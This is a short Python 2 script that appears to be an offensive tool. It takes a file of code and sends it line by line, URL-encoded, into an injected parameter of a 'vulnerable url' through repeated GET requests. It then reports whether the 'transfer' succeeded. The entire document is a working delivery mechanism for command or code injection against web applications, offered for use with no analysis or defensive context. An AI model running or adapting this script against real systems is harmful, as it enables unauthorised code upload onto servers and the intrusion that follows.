import urllib
import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('-f', '--file', required=True, type=str, help='file with code to send')
parser.add_argument('-u', '--url', required=True, type=str, help='full vulnerable url (minus injected parameter')
parser.add_argument('-p', '--parameter', required=True, type=str, help='injected parameter (ex: cmd)')
parser.add_argument('-v', '--verbose', action='count', default=0, help='increased detail')
args = parser.parse_args()

print '[+] url: {0}, parameter: {1}'.format(args.url, args.parameter)
with open(args.file, 'rb') as f:
    print '[+] code read from file: {0}'.format(args.file)
    print '[+] sending requests...'
    status_codes = []
    for line in f.readlines():
        # eliminate whitespace & newlines
        line = line.strip()
        tmp_url = args.url.split('&')
        if args.verbose > 1:
            print 'VERBOSE: {0}'.format(tmp_url)
        # save end parameter separate, in case of null byte inclusion
        end_url = tmp_url.pop()
        if args.verbose > 1:
            print 'VERBOSE: {0}'.format(end_url)
        # stitch url back together with &'s
        url = '&'.join(tmp_url)
        # strip leftmost &
        url = url.lstrip('&')
        if args.verbose > 1:
            print 'VERBOSE: {0}'.format(url)
        # append the parameter + encoded line of code + last parameter
        url += '&{0}={1}&{2}'.format(args.parameter, urllib.quote_plus(line), end_url)
        if args.verbose > 1:
            print 'VERBOSE: {0}'.format(url)
            print

        if args.verbose > 0:
            print '[+] sending: {0}'.format(url)
        r = requests.get(url)
        status_codes.append(r.status_code)
        if args.verbose > 0:
            if r.status_code == 200:
                print '[+] success!'
            else:
                print '[!] error: {0} - {1}'.format(r.status_code, r.reason)

if len(set(status_codes)) == 1 and 200 in set(status_codes):
    print '[+] 100% successful transfer!'
else:
    print '[!] You encountered errors with the transfer. Response codes: {}'.format(set(status_codes))